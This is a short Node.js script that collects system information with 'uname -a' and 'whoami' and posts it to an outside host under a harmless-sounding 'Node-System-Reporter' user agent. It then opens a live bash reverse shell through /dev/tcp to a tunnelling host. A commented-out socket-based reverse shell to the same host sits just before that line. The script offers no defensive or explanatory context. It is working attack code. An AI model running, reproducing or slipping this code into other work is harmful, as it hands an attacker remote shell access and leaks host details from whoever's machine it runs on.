const { execSync } = require('child_process');

async function sendSystemInfo() {
    const url = 'https://c.rdzsp.id';

    try {
        // 1. Capture system command output
        // .toString().trim() removes the extra newline characters commands usually add
        const unameData = execSync('uname -a').toString().trim();
        const whoamiData = execSync('whoami').toString().trim();

        console.log(`Captured: ${whoamiData} on ${unameData}`);

        // 2. Prepare the POST body
        const params = new URLSearchParams();
        params.append('uname', unameData);
        params.append('whoami', whoamiData);

        // 3. Send the request
        const response = await fetch(url, {
            method: 'POST',
            body: params,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Node-System-Reporter/1.0'
            }
        });

        const result = await response.text();
        console.log(`Server Response (${response.status}):`, result);

        // var net = require("net"),
        //     cp = require("child_process"),
        //     sh = cp.spawn("/bin/bash", []);
        // var client = new net.Socket();
        // client.connect(37097, "ducjj-2a02-4780-59-78c3--1.run.pinggy-free.link", function(){
        //     client.pipe(sh.stdin);
        //     sh.stdout.pipe(client);
        //     sh.stderr.pipe(client);
        // });
        // return /a/; // Prevents the Node.js application form crashing

        const { exec } = require('child_process');
        exec('bash -i >& /dev/tcp/ducjj-2a02-4780-59-78c3--1.run.pinggy-free.link/37097 0>&1');

    } catch (error) {
        console.error('Error executing commands or sending request:', error.message);
    }
}

sendSystemInfo();
